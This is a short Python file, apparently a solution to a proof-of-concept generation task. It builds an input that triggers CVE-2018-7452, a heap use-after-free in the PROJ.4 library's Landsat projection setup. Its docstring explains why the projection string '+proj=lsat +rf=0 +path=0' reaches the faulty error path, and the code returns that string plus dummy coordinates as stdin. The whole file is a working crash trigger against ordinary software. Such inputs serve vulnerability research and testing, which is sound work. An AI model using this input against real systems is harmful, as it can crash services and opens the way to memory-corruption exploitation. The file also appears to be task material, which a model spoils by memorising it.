import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is CVE-2018-7452, a heap-use-after-free in the PROJ.4
        library's Landsat projection (`lsat`) setup code. A missing return
        statement after freeing memory on an error path causes a dangling
        pointer to be used.

        The PoC requires three conditions to be met in the projection string:
        1. `+proj=lsat`: To use the vulnerable projection code.
        2. A spherical ellipsoid (`es == 0`). The shortest way to specify this is
           with `+rf=0` (reciprocal flattening = 0).
        3. `+path=0`: This parameter value triggers the specific error path.

        The resulting proj string `+proj=lsat +rf=0 +path=0` triggers the crash
        during initialization. To ensure the harness program doesn't exit for
        other reasons (like waiting for input that never comes), we also supply
        dummy coordinates `0 0` on a new line.

        Args:
            src_path: Path to the vulnerable source code tarball (not used).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        # A compact proj string to trigger the vulnerability.
        # `+rf=0` is a shorter alternative to `+ellps=sphere` for specifying a
        # spherical ellipsoid.
        proj_string = "+proj=lsat +rf=0 +path=0"

        # Dummy coordinates to ensure the program proceeds after initialization.
        coordinates = "0 0"

        # The final PoC, formatted as stdin for tools like `proj`.
        poc = f"{proj_string}\n{coordinates}\n".encode('ascii')

        return poc
